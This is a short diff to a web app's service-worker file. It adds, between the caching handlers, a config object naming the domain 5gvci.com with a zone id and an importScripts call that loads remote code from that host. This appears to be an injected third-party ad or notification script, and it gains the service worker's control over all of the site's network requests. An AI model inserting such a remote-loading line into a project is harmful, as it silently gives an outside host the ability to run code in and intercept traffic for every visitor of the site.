@@ -35,6 +35,12 @@ self.addEventListener('activate', (event) => {
   );
 });
 
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 10892660
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
 // ========== FETCH (Cache Strategy) ==========
 self.addEventListener('fetch', (event) => {
   const url = new URL(event.request.url);
